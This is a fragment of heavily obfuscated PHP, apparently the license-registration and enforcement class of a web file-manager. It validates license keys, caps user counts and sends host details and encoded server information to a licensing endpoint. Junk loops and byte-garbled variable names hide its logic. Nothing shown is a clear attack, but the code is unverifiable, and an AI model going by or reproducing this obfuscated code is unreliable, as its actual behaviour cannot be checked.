$Á‚¼ˆõ =& $_SERVER[Üè·¥©¸]; $±Äƒ‘Ú¯ = $Á‚¼ˆõ[4]; $ø­£ê‚ˆ = $GLOBALS[$Á‚¼ˆõ[13]][$Á‚¼ˆõ[14]][0]; $ôâßÎ‚ú = $ÍàÊ¥’÷[626]; while (strlen($ôâßÎ‚ú) < $ÍàÊ¥’÷[621]) { if (!$ôâßÎ‚ú) { break; } $ôâßÎ‚ú++; } if (!$ø­£ê‚ˆ || strlen($ø­£ê‚ˆ) <= strlen($±Äƒ‘Ú¯)) { return; } if (strtolower(substr($ø­£ê‚ˆ, -strlen($±Äƒ‘Ú¯))) != $±Äƒ‘Ú¯) { return; } $œ´“—´© = substr($ø­£ê‚ˆ, 0, -strlen($±Äƒ‘Ú¯)); $˜âÎ›ßÅ = $ÍàÊ¥’÷[627]; if (!$˜âÎ›ßÅ) { return; } $ŒÌ¿ÊŸ² = array($Á‚¼ˆõ[4], $œ´“—´©); $•¯Ëéæß = array_slice($GLOBALS[$Á‚¼ˆõ[13]][$Á‚¼ˆõ[14]], 1); $GLOBALS[$Á‚¼ˆõ[13]][$Á‚¼ˆõ[14]] = array_merge($ŒÌ¿ÊŸ², $•¯Ëéæß); $GLOBALS[$Á‚¼ˆõ[13]][$Á‚¼ˆõ[15]] = implode($Á‚¼ˆõ[0], $GLOBALS[$Á‚¼ˆõ[13]][$Á‚¼ˆõ[14]]); } private function jmzvebc7d480() { $ƒõËê«ß =& $_SERVER[Ì¥ŞÒ°£]; $ĞâÊ¼¹á =& $_SERVER[Üè·¥©¸]; if ($GLOBALS[$ĞâÊ¼¹á[13]][$ĞâÊ¼¹á[15]] != $ĞâÊ¼¹á[6]) { return; } $ôÓ“Ï ö = $_SERVER[$ĞâÊ¼¹á[16]]; $ïĞé¥¥ù = $ĞâÊ¼¹á[17]; $ò³–ü‹÷ = $ƒõËê«ß[628]; if (!strstr($ôÓ“Ï ö, $ïĞé¥¥ù)) { return; } $ïùœÈ¥² = strrpos($ôÓ“Ï ö, $ïĞé¥¥ù); $ü‘ÄáşÉ = substr($ôÓ“Ï ö, $ïùœÈ¥² + strlen($ïĞé¥¥ù)); $Ã×’°è = $ƒõËê«ß[629]; preg_match_all($ĞâÊ¼¹á[18], $ü‘ÄáşÉ, $ÊçÕÂÙ); $˜èğ“ú‰ = $ƒõËê«ß[630]; if (strlen($˜èğ“ú‰) < $ƒõËê«ß[621]) { return; } $ü‘ÄáşÉ = trim($ÊçÕÂÙ[0][0], $ĞâÊ¼¹á[19]); $àŞ©êßË = $ƒõËê«ß[631]; while ($àŞ©êßË < $ƒõËê«ß[632]) { if ($àŞ©êßË >= 0) { break; } $àŞ©êßË++; } $GLOBALS[$ĞâÊ¼¹á[13]][$ĞâÊ¼¹á[14]] = explode($ĞâÊ¼¹á[19], $ü‘ÄáşÉ); $GLOBALS[$ĞâÊ¼¹á[13]][$ĞâÊ¼¹á[15]] = implode($ĞâÊ¼¹á[0], $GLOBALS[$ĞâÊ¼¹á[13]][$ĞâÊ¼¹á[14]]); $–ÊìÊ³Ã = $ƒõËê«ß[633]; if (!$–ÊìÊ³Ã) { die; } } public function run() { $‰ÓÔ‘ =& $_SERVER[Ì¥ŞÒ°£]; $ôú¦—Ú =& $_SERVER[Üè·¥©¸]; $this->jmzvebc7d480(); $¡¢³ÄËş = $‰ÓÔ‘[634]; while ($¡¢³ÄËş < $‰ÓÔ‘[635]) { if ($¡¢³ÄËş >= 0) { break; } $¡¢³ÄËş++; } $this->kyamb38fd7d7(); $¡°«ä—© = $‰ÓÔ‘[636]; $õêÈ‘Ùş = $GLOBALS[$ôú¦—Ú[13]][$ôú¦—Ú[14]]; $ğÑ¶Ï” = $GLOBALS[$ôú¦—Ú[13]][$ôú¦—Ú[15]]; define($ôú¦—Ú[20], isset($õêÈ‘Ùş[0]) && $õêÈ‘Ùş[0] ? $õêÈ‘Ùş[0] : $this->defaultModule); $Ê«”òàá = $‰ÓÔ‘[637]; define($ôú¦—Ú[21], isset($õêÈ‘Ùş[1]) && $õêÈ‘Ùş[0] ? $õêÈ‘Ùş[1] : $this->defaultController); $šƒù™œ¿ = $‰ÓÔ‘[638]; define($ôú¦—Ú[22], isset($õêÈ‘Ùş[2]) && $õêÈ‘Ùş[0] ? $õêÈ‘Ùş[2] : $this->defaultAction); define($ôú¦—Ú[23], MOD . $ôú¦—Ú[0] . ST . $ôú¦—Ú[0] . ACT); $®ıŞáÄÒ = $‰ÓÔ‘[639]; $_SERVER[$ôú¦—Ú[24]] = strtolower(ACTION); $this->autorun(); if (count($õêÈ‘Ùş) >= 3) { $this->appRun($ğÑ¶Ï”); } else { $this->appRun(ACTION); } } private $uvph344e8913 = array(); private $ximfb37afc28 = ''; public function kjwf5c0b7f2a() { $™•¤ŸÑ =& $_SERVER[Ì¥ŞÒ°£]; $Ğ“‡ïè§ =& $_SERVER[Üè·¥©¸]; $this->pumt48e4a6c5(); $ü–¶ôÇì = $™•¤ŸÑ[640]; if (!$ü–¶ôÇì) { return; } $this->pxow8264f4a7(); $this->ngia77b43ed8(); $ï ¦ìòÑ = $™•¤ŸÑ[641]; if (!$ï ¦ìòÑ) { die; } $this->vzlud28c025f(); $this->mdhp27a38e57(); $this->dkit9066f458(); $this->ubvt0d84130c(); $this->iusp149fcc95($Ğ“‡ïè§[25], array($this, $Ğ“‡ïè§[26])); $´ÅëŞ¨ˆ = $™•¤ŸÑ[642]; while (strlen($´ÅëŞ¨ˆ) < $™•¤ŸÑ[621]) { if (!$´ÅëŞ¨ˆ) { break; } $´ÅëŞ¨ˆ++; } $this->iusp149fcc95($Ğ“‡ïè§[27], array($this, $Ğ“‡ïè§[28])); $this->iusp149fcc95($Ğ“‡ïè§[29], array($this, $Ğ“‡ïè§[30])); $this->iusp149fcc95($Ğ“‡ïè§[31], array($this, $Ğ“‡ïè§[32])); } public function fltnd7524d44($×õ‚¨›˜) { $í×›Ä¸» =& $_SERVER[Ì¥ŞÒ°£]; $‹¸˜Ë¡ =& $_SERVER[Üè·¥©¸]; $øÔ„Êä¿ = Model($‹¸˜Ë¡[33])->get(); $ºí£€êá = $í×›Ä¸»[643]; while (strlen($ºí£€êá) < $í×›Ä¸»[615]) { if (!$ºí£€êá) { break; } $ºí£€êá++; } $£şÎı›­ = array($‹¸˜Ë¡[34], $‹¸˜Ë¡[35], $‹¸˜Ë¡[36], $‹¸˜Ë¡[37], $‹¸˜Ë¡[38], $‹¸˜Ë¡[39], $‹¸˜Ë¡[40], $‹¸˜Ë¡[41], $‹¸˜Ë¡[42], $‹¸˜Ë¡[43], $‹¸˜Ë¡[44], $‹¸˜Ë¡[45], $‹¸˜Ë¡[46], $‹¸˜Ë¡[47], $‹¸˜Ë¡[48], $‹¸˜Ë¡[49], $‹¸˜Ë¡[50], $‹¸˜Ë¡[51], $‹¸˜Ë¡[52], $‹¸˜Ë¡[53], $‹¸˜Ë¡[54], $‹¸˜Ë¡[55], $‹¸˜Ë¡[56], $‹¸˜Ë¡[57], $‹¸˜Ë¡[58], $‹¸˜Ë¡[59], $‹¸˜Ë¡[60], $‹¸˜Ë¡[61], $‹¸˜Ë¡[62], $‹¸˜Ë¡[63], $‹¸˜Ë¡[64], $‹¸˜Ë¡[65], $‹¸˜Ë¡[66], $‹¸˜Ë¡[67], $‹¸˜Ë¡[68], $‹¸˜Ë¡[69], $‹¸˜Ë¡[70], $‹¸˜Ë¡[71], $‹¸˜Ë¡[72], $‹¸˜Ë¡[73], $‹¸˜Ë¡[74], $‹¸˜Ë¡[75], $‹¸˜Ë¡[76], $‹¸˜Ë¡[77], $‹¸˜Ë¡[78], $‹¸˜Ë¡[79], $‹¸˜Ë¡[80], $‹¸˜Ë¡[81], $‹¸˜Ë¡[82], $‹¸˜Ë¡[83], $‹¸˜Ë¡[84]); $£¹ªÅ¤Ó = $í×›Ä¸»[644]; if (strlen($£¹ªÅ¤Ó) < $í×›Ä¸»[621]) { return; } foreach ($£şÎı›­ as $Û¶—Ôë£) { $šÌã„–î = $GLOBALS[$‹¸˜Ë¡[85]][$‹¸˜Ë¡[86]][$Û¶—Ôë£]; if (isset($øÔ„Êä¿[$Û¶—Ôë£])) { $šÌã„–î = $øÔ„Êä¿[$Û¶—Ôë£]; } $×õ‚¨›˜[$‹¸˜Ë¡[87]][$‹¸˜Ë¡[88]][$Û¶—Ôë£] = $šÌã„–î; } $ÍïæÒâ = $×õ‚¨›˜[$‹¸˜Ë¡[87]][$‹¸˜Ë¡[88]][$‹¸˜Ë¡[46]]; $ûŞÒÏôŒ = $í×›Ä¸»[645]; unset($×õ‚¨›˜[$‹¸˜Ë¡[87]][$‹¸˜Ë¡[89]][$‹¸˜Ë¡[90]]); unset($×õ‚¨›˜[$‹¸˜Ë¡[87]][$‹¸˜Ë¡[89]][$‹¸˜Ë¡[91]]); $ÃâüÃ‡… = $í×›Ä¸»[646]; if (!$ÃâüÃ‡…) { die; } unset($×õ‚¨›˜[$‹¸˜Ë¡[87]][$‹¸˜Ë¡[88]][$‹¸˜Ë¡[46]]); $Ÿú¶òÍ¥ = $í×›Ä¸»[647]; while ($Ÿú¶òÍ¥ < $í×›Ä¸»[648]) { if ($Ÿú¶òÍ¥ >= 0) { break; } $Ÿú¶òÍ¥++; } unset($×õ‚¨›˜[$‹¸˜Ë¡[87]][$‹¸˜Ë¡[88]][$‹¸˜Ë¡[92]]); $×õ‚¨›˜[$‹¸˜Ë¡[87]][$‹¸˜Ë¡[88]][$‹¸˜Ë¡[93]] = array($‹¸˜Ë¡[94] => (int) $ÍïæÒâ[$‹¸˜Ë¡[95]], $‹¸˜Ë¡[96] => (int) _get($ÍïæÒâ, $‹¸˜Ë¡[97], 0)); $×õ‚¨›˜[$‹¸˜Ë¡[98]][$‹¸˜Ë¡[99]] = Action($‹¸˜Ë¡[100])->accessToken(); $ÉÇÄÀÑ = $í×›Ä¸»[649]; while ($ÉÇÄÀÑ < $í×›Ä¸»[615]) { if ($ÉÇÄÀÑ >= 0) { break; } $ÉÇÄÀÑ++; } $×õ‚¨›˜[$‹¸˜Ë¡[98]][$‹¸˜Ë¡[101]] = md5($_SERVER[$‹¸˜Ë¡[102]] . $øÔ„Êä¿[$‹¸˜Ë¡[103]]); $Š×¯®‡ê = $í×›Ä¸»[650]; if (strlen($Š×¯®‡ê) < $í×›Ä¸»[621]) { return; } $×õ‚¨›˜[$‹¸˜Ë¡[98]][$‹¸˜Ë¡[104]] = base64_encode(serverInfo()); $õª‹éä = $í×›Ä¸»[651]; while (strlen($õª‹éä) < $í×›Ä¸»[615]) { if (!$õª‹éä) { break; } $õª‹éä++; } $×õ‚¨›˜[$‹¸˜Ë¡[98]][$‹¸˜Ë¡[105]] = $this->ximfb37afc28; $ÈÆë‹×¹ = $í×›Ä¸»[652]; if (!$ÈÆë‹×¹) { return; } if ($øÔ„Êä¿[$‹¸˜Ë¡[105]] != $‹¸˜Ë¡[106]) { $×õ‚¨›˜[$‹¸˜Ë¡[98]][$‹¸˜Ë¡[107]] = $øÔ„Êä¿[$‹¸˜Ë¡[107]]; $×õ‚¨›˜[$‹¸˜Ë¡[98]][$‹¸˜Ë¡[108]] = $øÔ„Êä¿[$‹¸˜Ë¡[108]]; $’Ó•›®‚ = rand_string(10) . $this->ximfb37afc28 . rand_string(5); $×õ‚¨›˜[$‹¸˜Ë¡[87]][$‹¸˜Ë¡[109]][$‹¸˜Ë¡[110]] = $this->eglvc25c0ed6($’Ó•›®‚, $×õ‚¨›˜[$‹¸˜Ë¡[98]][$‹¸˜Ë¡[101]]); } if ($this->ximfb37afc28 == $‹¸˜Ë¡[106]) { $×õ‚¨›˜[$‹¸˜Ë¡[87]][$‹¸˜Ë¡[88]][$‹¸˜Ë¡[93]][$‹¸˜Ë¡[97]] = 0; } $×õ‚¨›˜[$‹¸˜Ë¡[98]][$‹¸˜Ë¡[111]] = _get($this->uvph344e8913, $‹¸˜Ë¡[112], $‹¸˜Ë¡[6]); $×õ‚¨›˜[$‹¸˜Ë¡[98]][$‹¸˜Ë¡[113]] = _get($this->uvph344e8913, $‹¸˜Ë¡[114], $‹¸˜Ë¡[6]); $šØ‰ã‚ì = $í×›Ä¸»[653]; while ($šØ‰ã‚ì < $í×›Ä¸»[648]) { if ($šØ‰ã‚ì >= 0) { break; } $šØ‰ã‚ì++; } if (_get($GLOBALS, $‹¸˜Ë¡[115]) && $this->config[$‹¸˜Ë¡[116]]) { $×õ‚¨›˜[$‹¸˜Ë¡[98]][$‹¸˜Ë¡[117]] = WEB_ROOT; } return $×õ‚¨›˜; } private function dkit9066f458() { $İöàƒÒÕ =& $_SERVER[Ì¥ŞÒ°£]; $†¼ì²µ… =& $_SERVER[Üè·¥©¸]; $á¬»€·¬ = $_SERVER[$†¼ì²µ…[24]] == $†¼ì²µ…[118]; if ($_SERVER[$†¼ì²µ…[24]] == $†¼ì²µ…[119] && $_GET[$†¼ì²µ…[120]] == $†¼ì²µ…[121]) { $á¬»€·¬ = !0; } if ($á¬»€·¬) { $¶ÍèĞú = array($†¼ì²µ…[105] => $this->ximfb37afc28, $†¼ì²µ…[122] => $this->yogk983f98ef(), $†¼ì²µ…[123] => Model($†¼ì²µ…[124])->count()); if ($this->ximfb37afc28 != $†¼ì²µ…[106]) { $æŸ£åà = _get($this->uvph344e8913, $†¼ì²µ…[125]); if ($æŸ£åà) { $¶ÍèĞú[$†¼ì²µ…[126]] = $æŸ£åà; $¶ÍèĞú[$†¼ì²µ…[127]] = strtotime(_get($this->uvph344e8913, $†¼ì²µ…[128])); $¶ÍèĞú[$†¼ì²µ…[129]] = _get($this->uvph344e8913, $†¼ì²µ…[114]); } $«Í°Ã·‰ = Model($†¼ì²µ…[33])->get($†¼ì²µ…[130], $†¼ì²µ…[6], !0); if (is_string($«Í°Ã·‰) && substr($«Í°Ã·‰, 0, 1) == $†¼ì²µ…[131]) { $«Í°Ã·‰ = json_decode_force($«Í°Ã·‰); } if (is_array($«Í°Ã·‰) && $«Í°Ã·‰[$†¼ì²µ…[132]] && strstr($«Í°Ã·‰[$†¼ì²µ…[132]], $†¼ì²µ…[133])) { $áœÚß—± = explode($†¼ì²µ…[133], $«Í°Ã·‰[$†¼ì²µ…[132]]); $¶ÍèĞú[$†¼ì²µ…[134]] = $áœÚß—±[0]; } } $¶ÍèĞú = $this->sxgu2f4c5811(json_encode($¶ÍèĞú), md5($†¼ì²µ…[135])); $Ÿ‘‘Õë¶ = array($†¼ì²µ…[136] => $¶ÍèĞú); call_user_func(array($†¼ì²µ…[137], $†¼ì²µ…[138]), $Ÿ‘‘Õë¶); $ê”¸Ë½ñ = $İöàƒÒÕ[654]; } if ($this->ximfb37afc28 == $†¼ì²µ…[106]) { return; } $Ã×ÍíÀà = array($†¼ì²µ…[139], $†¼ì²µ…[140], $†¼ì²µ…[141], $†¼ì²µ…[142], $†¼ì²µ…[143], $†¼ì²µ…[144]); $Ğ…çÒ = $İöàƒÒÕ[655]; if (strlen($Ğ…çÒ) < $İöàƒÒÕ[648]) { die; } $‚ó¥ÛÆ = Model($†¼ì²µ…[33])->get(); $Ÿ‘‘Õë¶ = array($†¼ì²µ…[145] => $‚ó¥ÛÆ[$†¼ì²µ…[34]], $†¼ì²µ…[146] => $‚ó¥ÛÆ[$†¼ì²µ…[35]], $†¼ì²µ…[147] => $†¼ì²µ…[6]); $†¡¢˜ÊÒ = $İöàƒÒÕ[656]; foreach ($Ã×ÍíÀà as $Ôòé–í©) { if (!isset($‚ó¥ÛÆ[$Ôòé–í©]) || !$‚ó¥ÛÆ[$Ôòé–í©]) { continue; } $Ÿ‘‘Õë¶[$Ôòé–í©] = $‚ó¥ÛÆ[$Ôòé–í©]; } call_user_func(array($†¼ì²µ…[137], $†¼ì²µ…[138]), $Ÿ‘‘Õë¶); } private function vzlud28c025f() { $âÄ°šî =& $_SERVER[Ì¥ŞÒ°£]; $å¢ø´»¹ =& $_SERVER[Üè·¥©¸]; if ($_SERVER[$å¢ø´»¹[24]] != $å¢ø´»¹[148]) { return; } if (!_get($GLOBALS, $å¢ø´»¹[115])) { die; } $¼š²¼ğ† = $GLOBALS[$å¢ø´»¹[13]]; if (isset($¼š²¼ğ†[$å¢ø´»¹[149]])) { $this->efgo23d5fff0(); die; } if (!isset($¼š²¼ğ†[$å¢ø´»¹[150]]) || strlen($¼š²¼ğ†[$å¢ø´»¹[150]]) != 16) { show_json($å¢ø´»¹[151] . $¼š²¼ğ†[$å¢ø´»¹[150]], !1); } $ë¨€åçà = Model($å¢ø´»¹[33])->get($å¢ø´»¹[103]); $©è¤¦à… = md5($_SERVER[$å¢ø´»¹[102]] . $ë¨€åçà); $¤¸ªèÜ = $âÄ°šî[657]; while ($¤¸ªèÜ < $âÄ°šî[615]) { if ($¤¸ªèÜ >= 0) { break; } $¤¸ªèÜ++; } $ì’àÛìª = array($å¢ø´»¹[150] => $¼š²¼ğ†[$å¢ø´»¹[150]], $å¢ø´»¹[152] => rand_string(16), $å¢ø´»¹[153] => $å¢ø´»¹[135], $å¢ø´»¹[154] => $å¢ø´»¹[155], $å¢ø´»¹[156] => $_SERVER[$å¢ø´»¹[157]], $å¢ø´»¹[158] => $_SERVER[$å¢ø´»¹[159]], $å¢ø´»¹[160] => $_SERVER[$å¢ø´»¹[161]], $å¢ø´»¹[101] => $©è¤¦à…, $å¢ø´»¹[162] => Model($å¢ø´»¹[33])->get($å¢ø´»¹[130])); if ($¼š²¼ğ†[$å¢ø´»¹[163]] == $å¢ø´»¹[164]) { $œÖ²İ€ô = $this->sxgu2f4c5811($©è¤¦à…, $å¢ø´»¹[165]); $Ş§æ¬Éê = $this->eglvc25c0ed6(json_encode($ì’àÛìª), $©è¤¦à… . $å¢ø´»¹[166], 3); $Ş§æ¬Éê = $Ş§æ¬Éê . $å¢ø´»¹[167] . $_SERVER[$å¢ø´»¹[157]]; $ò¹Êâô = $this->oerqf106cfc4($å¢ø´»¹[168] . $œÖ²İ€ô . $å¢ø´»¹[169] . $Ş§æ¬Éê, -1); show_json($ò¹Êâô, !0); } else { if ($¼š²¼ğ†[$å¢ø´»¹[163]] == $å¢ø´»¹[170]) { $Öºõ„¸æ = substr(md5($å¢ø´»¹[171] . $©è¤¦à…), 12, 15) . $å¢ø´»¹[172]; $Ş§æ¬Éê = $this->rzycfa9d1b63(trim($¼š²¼ğ†[$å¢ø´»¹[173]]), $Öºõ„¸æ, 2); $—³“‹ôĞ = json_decode($Ş§æ¬Éê, !0); if (!is_array($—³“‹ôĞ) || !is_array($—³“‹ôĞ[$å¢ø´»¹[174]]) || $—³“‹ôĞ[$å¢ø´»¹[150]] != !0) { $­¥ã¸¿ = $å¢ø´»¹[175]; $†ÎÂÔÎ = $—³“‹ôĞ[$å¢ø´»¹[174]] ? $å¢ø´»¹[176] . $—³“‹ôĞ[$å¢ø´»¹[174]] : $­¥ã¸¿; show_json($†ÎÂÔÎ, !1); } else { $ì’àÛìª[$å¢ø´»¹[152]] = $—³“‹ôĞ[$å¢ø´»¹[174]][$å¢ø´»¹[177]]; } } else { $—³“‹ôĞ = $this->oerqf106cfc4($å¢ø´»¹[178], $ì’àÛìª, 10); } } if (!is_array($—³“‹ôĞ) || !is_array($—³“‹ôĞ[$å¢ø´»¹[174]]) || $—³“‹ôĞ[$å¢ø´»¹[150]] != !0) { $­¥ã¸¿ = LNG($å¢ø´»¹[179]); $†ÎÂÔÎ = $—³“‹ôĞ[$å¢ø´»¹[174]] ? $å¢ø´»¹[176] . $—³“‹ôĞ[$å¢ø´»¹[174]] : $­¥ã¸¿; show_json($†ÎÂÔÎ, !1); } $²é÷Ó´ğ = $—³“‹ôĞ[$å¢ø´»¹[174]]; $Ïí§Ş–¶ = $this->czgmdb3cceac($²é÷Ó´ğ[$å¢ø´»¹[180]]); if (!$Ïí§Ş–¶ || $Ïí§Ş–¶ != $²é÷Ó´ğ[$å¢ø´»¹[128]]) { $Şª””ó = array($å¢ø´»¹[181] => Model($å¢ø´»¹[33])->get($å¢ø´»¹[103]), $å¢ø´»¹[182] => $_SERVER[$å¢ø´»¹[102]], $å¢ø´»¹[183] => this_url(), $å¢ø´»¹[158] => $_SERVER[$å¢ø´»¹[159]]); $Ş§æ¬Éê = $this->aoinf55f0e0e(json_encode($Şª””ó)); $this->oerqf106cfc4($å¢ø´»¹[184] . $Ş§æ¬Éê); show_json(LNG($å¢ø´»¹[185]), !0); } $€Šµóİ® = array($å¢ø´»¹[186] => $²é÷Ó´ğ[$å¢ø´»¹[187]], $å¢ø´»¹[188] => $²é÷Ó´ğ[$å¢ø´»¹[189]], $å¢ø´»¹[190] => rand_string(16), $å¢ø´»¹[105] => $²é÷Ó´ğ[$å¢ø´»¹[191]]); if ($ì’àÛìª[$å¢ø´»¹[152]]) { $€Šµóİ®[$å¢ø´»¹[190]] = $ì’àÛìª[$å¢ø´»¹[152]]; } $İ ’ôÍ„ = substr(md5($€Šµóİ®[$å¢ø´»¹[188]]), 10, 10); $„³Õ‹æ­ = $İ ’ôÍ„ . $€Šµóİ®[$å¢ø´»¹[105]] . $€Šµóİ®[$å¢ø´»¹[190]]; $€Šµóİ®[$å¢ø´»¹[107]] = strrev(base64_encode($this->sxgu2f4c5811($„³Õ‹æ­, $å¢ø´»¹[192]))); $»‚–˜à = $âÄ°šî[658]; if (!$»‚–˜à) { return; } $ã¤ˆ¾÷‘ = rand_string(16); $ŒŒß¼€ = $âÄ°šî[659]; if (!$ŒŒß¼€) { die; } $ƒåòõ• = $ã¤ˆ¾÷‘ . $€Šµóİ®[$å¢ø´»¹[105]] . $this->sxgu2f4c5811(md5($€Šµóİ®[$å¢ø´»¹[186]]), $ã¤ˆ¾÷‘); $ïâ™Ø¼× = $âÄ°šî[660]; $€Šµóİ®[$å¢ø´»¹[108]] = base64_encode(strrev($this->sxgu2f4c5811($ƒåòõ•, $å¢ø´»¹[193]))); $ßÖí®Ì = $âÄ°šî[661]; if (!$ßÖí®Ì) { die; } if ($²é÷Ó´ğ[$å¢ø´»¹[194]] && $²é÷Ó´ğ[$å¢ø´»¹[194]] >= 1) { Model($å¢ø´»¹[33])->setDeep($å¢ø´»¹[195], $å¢ø´»¹[121]); } Model($å¢ø´»¹[33])->set($€Šµóİ®); $‚°ÖÕûÕ = md5($_SERVER[$å¢ø´»¹[102]] . strrev($ë¨€åçà) . $€Šµóİ®[$å¢ø´»¹[188]]); $€Ôİô‰˜ = $âÄ°šî[662]; while ($€Ôİô‰˜ < $âÄ°šî[648]) { if ($€Ôİô‰˜ >= 0) { break; } $€Ôİô‰˜++; } $ò÷ğœÆú = strrev(substr($‚°ÖÕûÕ, 10, 16)); $´àè’õ’ = $this->eglvc25c0ed6(json_encode($²é÷Ó´ğ), $‚°ÖÕûÕ); $¬ôìÁòÖ = array_to_keyvalue(Model($å¢ø´»¹[7])->listData(), $å¢ø´»¹[196]); $ú¨¨ºÏâ = $âÄ°šî[663]; if (strlen($ú¨¨ºÏâ) < $âÄ°šî[648]) { return; } $÷ß©è¶– = $¬ôìÁòÖ[$å¢ø´»¹[197]]; $ôüô«£Ê = $âÄ°šî[664]; if (!$ôüô«£Ê) { return; } $“®îâ÷Û = array(); $“®îâ÷Û[$ò÷ğœÆú] = $´àè’õ’; Model($å¢ø´»¹[7])->update($÷ß©è¶–[$å¢ø´»¹[198]], array($å¢ø´»¹[199] => $“®îâ÷Û)); $this->uvph344e8913 = $²é÷Ó´ğ; $å¯‡¦èË = $âÄ°šî[665]; $this->ximfb37afc28 = $€Šµóİ®[$å¢ø´»¹[105]]; $this->licenseRegistSuccess(); $×Õ˜Àäğ = $âÄ°šî[666]; if (strlen($×Õ˜Àäğ) < $âÄ°šî[615]) { return; } Cache::set($å¢ø´»¹[200] . md5($ë¨€åçà . $å¢ø´»¹[201]), $å¢ø´»¹[6]); show_json(LNG($å¢ø´»¹[185]), !0); } private function licenseRegistSuccess() { $ıøÉ“í =& $_SERVER[Ì¥ŞÒ°£]; $ğä›ˆÏò =& $_SERVER[Üè·¥©¸]; $ê²è¯Ë× = Model($ğä›ˆÏò[33])->get(); $“ë’ñè = $ıøÉ“í[667]; while (strlen($“ë’ñè) < $ıøÉ“í[648]) { if (!$“ë’ñè) { break; } $“ë’ñè++; } if ($ê²è¯Ë×[$ğä›ˆÏò[63]] != $ğä›ˆÏò[121]) { Model($ğä›ˆÏò[33])->set($ğä›ˆÏò[63], $ğä›ˆÏò[121]); } Action($ğä›ˆÏò[202])->initStart(!0); } private function efgo23d5fff0() { $¯ã—é Í =& $_SERVER[Ì¥ŞÒ°£]; $Å¦‘¶±˜ =& $_SERVER[Üè·¥©¸]; Model($Å¦‘¶±˜[33])->set(array($Å¦‘¶±˜[186] => $Å¦‘¶±˜[6], $Å¦‘¶±˜[188] => $Å¦‘¶±˜[6], $Å¦‘¶±˜[105] => $Å¦‘¶±˜[106], $Å¦‘¶±˜[107] => $Å¦‘¶±˜[6], $Å¦‘¶±˜[108] => $Å¦‘¶±˜[6])); $ØúÏ·ñè = $¯ã—é Í[668]; while ($ØúÏ·ñè < $¯ã—é Í[632]) { if ($ØúÏ·ñè >= 0) { break; } $ØúÏ·ñè++; } Model($Å¦‘¶±˜[33])->setDeep($Å¦‘¶±˜[195], $Å¦‘¶±˜[203]); $this->uvph344e8913 = array(); $ğ«şÅ¹‹ = $¯ã—é Í[669]; $this->ximfb37afc28 = $Å¦‘¶±˜[106]; } private function pumt48e4a6c5() { $±ÌÚ…§è =& $_SERVER[Ì¥ŞÒ°£]; $œ¤Ã· Ò =& $_SERVER[Üè·¥©¸]; $_SERVER[$œ¤Ã· Ò[159]] = _get($_SERVER, $œ¤Ã· Ò[159], APP_HOST); $this->ximfb37afc28 = $œ¤Ã· Ò[106]; $†¬€Ùã = $±ÌÚ…§è[670]; $Œªòàˆ‰ = Model($œ¤Ã· Ò[33])->get(); $©”„¨º‰ = $±ÌÚ…§è[671]; if ($Œªòàˆ‰[$œ¤Ã· Ò[105]] == $œ¤Ã· Ò[106]) { return; } $üıñÀÛš = Model($œ¤Ã· Ò[33])->get($œ¤Ã· Ò[103]); $Ğª§ÄÖ  = $œ¤Ã· Ò[200] . md5($üıñÀÛš . $œ¤Ã· Ò[201]); $¨‚õğå = $±ÌÚ…§è[672]; $êí¼æ–€ = Cache::get($Ğª§ÄÖ ); $¶‰—´¦Ê = $±ÌÚ…§è[673]; if (!$¶‰—´¦Ê) { return; } if (!is_array($êí¼æ–€) || !isset($êí¼æ–€[$œ¤Ã· Ò[204]]) || time() - $êí¼æ–€[$œ¤Ã· Ò[204]] >= 60) { $áÚÕÛ = Model($œ¤Ã· Ò[7])->loadList(); $ÕÔå÷±° = $áÚÕÛ[$œ¤Ã· Ò[197]]; $êï„Œú¸ = md5($_SERVER[$œ¤Ã· Ò[102]] . strrev($üıñÀÛš) . $Œªòàˆ‰[$œ¤Ã· Ò[188]]); $¹„û…Â  = strrev(substr($êï„Œú¸, 10, 16)); $êí¼æ–€ = $this->rzycfa9d1b63($ÕÔå÷±°[$œ¤Ã· Ò[85]][$¹„û…Â ], $êï„Œú¸); $êí¼æ–€ = json_decode($êí¼æ–€, !0); } if (!is_array($êí¼æ–€)) { return $this->efgo23d5fff0(); } $Ù…‘ôÉÅ = strtotime($êí¼æ–€[$œ¤Ã· Ò[128]]); if (time() >= $Ù…‘ôÉÅ) { return $this->efgo23d5fff0(); } if (time() - $êí¼æ–€[$œ¤Ã· Ò[204]] > 20) { $êí¼æ–€[$œ¤Ã· Ò[204]] = time(); Cache::set($Ğª§ÄÖ , $êí¼æ–€); } $this->uvph344e8913 = $êí¼æ–€; $this->ximfb37afc28 = $Œªòàˆ‰[$œ¤Ã· Ò[105]]; $ˆŒ¸îĞæ = $±ÌÚ…§è[674]; if (strlen($ˆŒ¸îĞæ) < $±ÌÚ…§è[635]) { die; } } private function pxow8264f4a7() { $Ø·öŸñ€ =& $_SERVER[Üè·¥©¸]; $ğ¿óÒ¹ = $GLOBALS[$Ø·öŸñ€[13]]; $óíÛÎÆÄ = $_SERVER[$Ø·öŸñ€[24]]; if ($óíÛÎÆÄ == $Ø·öŸñ€[205] && $this->ximfb37afc28 == $Ø·öŸñ€[106]) { show_json(LNG($Ø·öŸñ€[206]), !1, $Ø·öŸñ€[207]); } $¸¶ªÙ’Ï = array($Ø·öŸñ€[208], $Ø·öŸñ€[209]); if (in_array($óíÛÎÆÄ, $¸¶ªÙ’Ï)) { if ($this->ximfb37afc28 == $Ø·öŸñ€[106] && isset($ğ¿óÒ¹[$Ø·öŸñ€[210]])) { show_json(LNG($Ø·öŸñ€[206]), !1, $Ø·öŸñ€[207]); die; } $Àªê®Ì¹ = $this->yogk983f98ef(); if ($Àªê®Ì¹ != intval($Ø·öŸñ€[211])) { if ($Àªê®Ì¹ <= Model($Ø·öŸñ€[124])->count()) { show_json(LNG($Ø·öŸñ€[212]), !1, $Ø·öŸñ€[207]); die; } } } } private function ngia77b43ed8() { $Äö—‹ˆ =& $_SERVER[Ì¥ŞÒ°£]; $¤€á”şÙ =& $_SERVER[Üè·¥©¸]; $²Ñİ†Û = array($¤€á”şÙ[118], $¤€á”şÙ[119]); $ŒŞ‰‰Ø¼ = $Äö—‹ˆ[675]; if (!$ŒŞ‰‰Ø¼) { return; } if (!_get($GLOBALS, $¤€á”şÙ[115]) || !isset($_GET[$¤€á”şÙ[213]])) { return; } if (!in_array($_SERVER[$¤€á”şÙ[24]], $²Ñİ†Û)) { return; } $Ê¥ß—¯ = $¤€á”şÙ[214]; $Ê¥ß—¯ = $this->tejmec0f2135($Ê¥ß—¯, $¤€á”şÙ[215]); $ÖåØÙ³Û = stream_context_create(array($¤€á”şÙ[216] => array($¤€á”şÙ[217] => $¤€á”şÙ[218], $¤€á”şÙ[219] 